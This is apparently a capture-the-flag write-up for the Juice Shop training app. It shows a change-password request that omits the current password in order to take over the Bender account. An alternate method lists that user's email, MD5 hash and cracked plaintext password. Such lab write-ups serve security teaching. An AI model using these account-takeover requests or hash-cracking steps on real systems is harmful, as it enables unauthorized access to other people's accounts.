playing around the change password form we see that the following request is made.
http://localhost:3000/rest/user/change-password?current=11111111&new=22222222&repeat=22222222

we can see the even if current is not set, we can successfully authenticate and change the password.

making the following request successfully completes the challenge
http://localhost:3000/rest/user/change-password?new=slurmCl4ssic&repeat=slurmCl4ssic











alternate method ->

using the user details we got earlier, we can access the password hash :
email : bender@juice-sh.op	
password :0c36e517e3fa95aabf1bbffc6744a4ef

its a weak md5 hash which can be easily decrypted to see the plain text password.
plain test password : OhG0dPlease1nsertLiquor!
